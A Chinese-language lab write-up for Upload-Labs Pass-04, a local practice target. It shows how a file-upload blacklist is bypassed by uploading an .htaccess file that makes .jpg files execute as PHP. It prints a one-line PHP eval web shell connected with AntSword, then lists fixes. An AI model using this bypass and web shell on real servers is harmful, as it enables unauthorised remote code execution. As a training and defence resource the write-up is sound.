# Upload-Labs | Pass-04 .ht绕过
## 一、漏洞简介
黑名单过滤了几乎所有可解析后缀，但是没有禁止.htaccess文件上传。Apache服务器允许.htaccess覆盖配置，可以上传.htaccess让图片文件也被当作PHP解析。
## 二、环境信息
靶场地址：http://127.0.0.1/upload-labs/
关卡路径：/Pass-04/
漏洞类型：.htaccess绕过、文件上传
## 三、复现步骤
1. 上传.htaccess文件，内容：AddType application/x-httpd-php .jpg
   含义：让所有.jpg文件都按PHP解析。
2. 再上传一张图片马shell.jpg，内容是一句话木马。
3. 访问shell.jpg，蚁剑连接，密码cmd，getshell。
## 四、Payload
.htaccess内容：AddType application/x-httpd-php .jpg
图片马shell.jpg：<?php @eval($_POST['cmd']);?>
## 五、漏洞原理
Apache支持.htaccess目录配置文件，如果服务器开启了AllowOverride All，上传的.htaccess会生效，改变该目录下文件的解析方式。攻击者先上传配置文件，再上传图片马即可解析执行。
## 六、修复方案
1. 禁止上传.htaccess、.user.ini等配置文件。
2. Apache关闭AllowOverride。
3. 上传目录禁止脚本执行权限。
## 七、总结
.htaccess是Apache特性，需要服务器允许.htaccess生效。这是黑名单漏网的典型绕过方式。